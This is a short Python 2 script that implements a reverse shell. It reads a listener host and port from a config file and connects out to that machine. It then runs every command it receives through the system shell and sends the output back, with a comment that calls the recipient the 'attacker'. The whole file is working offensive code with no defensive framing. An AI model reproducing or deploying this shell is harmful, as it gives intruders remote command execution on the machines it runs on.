#!/usr/bin/python
import socket,subprocess
import ConfigParser

#load configuration file
Config = ConfigParser.ConfigParser()
Config.read("./etc/shell.conf")

#config function
def ConfigSectionMap(section):
    dict1 = {}
    options = Config.options(section)
    for option in options:
        try:
            dict1[option] = Config.get(section, option)
            if dict1[option] == -1:
                DebugPrint("skip: %s" % option)
        except:
            print("exception on %s!" % option)
            dict1[option] = None
    return dict1


HOST = ConfigSectionMap("global")['lhost']
PORT = ConfigSectionMap("global")['lport']


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to listening machine
s.connect((HOST, int(PORT)))
# send we are connected
s.send('[*] Connection Established!\n')
# start loop
while 1:
     # recieve shell command
     data = s.recv(1024)
     # if its quit, then break out and close socket
     if data == "quit": break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()
